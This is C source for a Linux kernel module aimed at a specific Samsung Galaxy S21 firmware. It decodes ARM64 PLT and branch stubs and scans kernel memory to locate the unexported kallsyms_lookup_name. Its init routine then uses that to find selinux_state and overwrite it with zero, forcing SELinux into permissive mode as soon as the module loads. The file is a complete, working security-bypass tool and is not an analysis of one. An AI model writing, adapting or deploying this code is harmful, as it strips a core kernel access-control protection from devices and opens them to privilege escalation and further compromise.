/* df_perm: permissive-only stager for SM-G991B/HZC2 (5.4.242).
 *
 * Minimal import surface (all proven/low-risk): printk, sprint_symbol,
 * memset, param_ops (via module_param). NO kprobe/kallsyms/UMH/filp imports.
 * Resolution: &sprint_symbol is the module PLT stub (adrp/ldr/br) ->
 * decode to kernel cfi_jt stub -> B-decode to real sprint_symbol
 * (self-check by name) -> +-4MB scan (kln 2.7KB away) ->
 * kallsyms_lookup_name("selinux_state") -> write 0.
 * Text reads proven working on HZC2 (df_tprobe). Always resident.
 */
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/string.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IonStack_S21");
MODULE_DESCRIPTION("permissive-only stager (HZC2)");

extern int sprint_symbol(char *buffer, unsigned long address);

static char *soft_reboot;
module_param(soft_reboot, charp, 0400);

typedef unsigned long (*kln_t)(const char *name);

#define SCAN_STRIDE	4UL
#define SCAN_MAX	(4UL * 1024UL * 1024UL / SCAN_STRIDE)

static int name_is(const char *buf, const char *want)
{
	int i;

	for (i = 0; want[i]; i++) {
		if (buf[i] != want[i])
			return 0;
	}
	return buf[i] == '+' && buf[i + 1] == '0' && buf[i + 2] == 'x' &&
	       buf[i + 3] == '0' && buf[i + 4] == '/';
}

/* Decode one ARM64 stub position: B (branch) or module-PLT triple
 * (adrp x16,page; ldr x16,[x16,#off]; br x16). Returns target or 0. */
static unsigned long follow_b(unsigned long addr)
{
	unsigned int insn = *(volatile unsigned int *)addr;
	long off;

	if ((insn & 0xfc000000) != 0x14000000)
		return 0;
	off = (long)(insn & 0x3ffffff);
	if (off & (1L << 25))
		off -= (1L << 26);
	return addr + off * 4;
}

static unsigned long follow_plt(unsigned long addr)
{
	unsigned int i0 = *(volatile unsigned int *)addr;
	unsigned int i1, i2;
	unsigned int rd;
	long page_off;
	unsigned long page, got;

	if (i0 == 0xd503245f) /* optional BTI C landing pad */
		addr += 4;
	i0 = *(volatile unsigned int *)addr;
	i1 = *(volatile unsigned int *)(addr + 4);
	i2 = *(volatile unsigned int *)(addr + 8);
	/* adrp Rd,page (Rd == 16, Rn field == 11111) */
	if ((i0 & 0x9f000000) != 0x90000000)
		return 0;
	if (((i0 >> 5) & 0x1f) != 0x1f)
		return 0;
	rd = i0 & 0x1f;
	if (rd != 16)
		return 0;
	/* ldr x16,[x16,#off], 8-byte scaled, no shift */
	if ((i1 & 0xffc003ff) != (0xf9400000 | (16 << 5) | 16))
		return 0;
	/* br x16 */
	if (i2 != (0xd61f0000 | (16 << 5)))
		return 0;
	page_off = (long)(((i0 >> 5) & 0x7ffff) << 2) | ((i0 >> 29) & 0x3);
	if (page_off & (1L << 20))
		page_off -= (1L << 21);
	page_off <<= 12;
	page = (addr & ~0xfffUL) + page_off;
	got = page + (((i1 >> 10) & 0xfff) << 3);
	return *(volatile unsigned long *)got;
}

/* One hop: try PLT triple first, then plain B. */
static unsigned long follow_one(unsigned long addr)
{
	unsigned long t;

	t = follow_plt(addr);
	if (t)
		return t;
	return follow_b(addr);
}


static unsigned long scan_one_dir(unsigned long start, int dir)
{
	static char buf[256];
	unsigned long a;
	unsigned long i, j;

	for (i = 0; i < SCAN_MAX; i++) {
		if (dir < 0) {
			if (start < (i + 1) * SCAN_STRIDE)
				break;
			a = start - (i + 1) * SCAN_STRIDE;
		} else {
			a = start + (i + 1) * SCAN_STRIDE;
		}
		for (j = 0; j < sizeof(buf); j++)
			buf[j] = 0;
		sprint_symbol(buf, a);
		if (name_is(buf, "kallsyms_lookup_name"))
			return a;
	}
	return 0;
}

static int __init dfp_init(void)
{
	unsigned long anchor = (unsigned long)&sprint_symbol;
	unsigned long real = 0, found = 0, sstate, cur;
	kln_t kln;
	static char buf[256];
	unsigned long k;
	int hops;

	/* Follow B-hops from the anchor (module PLT and/or kernel cfi_jt
	 * stubs are all plain B insns): stop at the first address whose
	 * sprint_symbol name is exactly "sprint_symbol". Max 4 hops. */
	cur = anchor;
	for (hops = 0; hops < 4; hops++) {
		unsigned long nxt = follow_one(cur);

		if (!nxt)
			break;
		cur = nxt;
		for (k = 0; k < sizeof(buf); k++)
			buf[k] = 0;
		sprint_symbol(buf, cur);
		if (name_is(buf, "sprint_symbol")) {
			real = cur;
			break;
		}
		if (!name_is(buf, "sprint_symbol.cfi_jt"))
			break;
	}
	for (k = 0; k < sizeof(buf); k++)
		buf[k] = 0;
	if (real)
		sprint_symbol(buf, real);
	if (!real || !name_is(buf, "sprint_symbol")) {
		pr_info("dfp: anchor failed\n");
		goto done;
	}
	found = scan_one_dir(real, -1);
	if (!found)
		found = scan_one_dir(real, +1);
	if (!found)
		goto done;
	kln = (kln_t)found;
	sstate = kln("selinux_state");
	if (!sstate)
		goto done;
	*(volatile unsigned char *)sstate = 0;
	__asm__ volatile("dsb sy" ::: "memory");
	pr_info("dfp: permissive set\n");
done:
	return 0;
}

module_init(dfp_init);
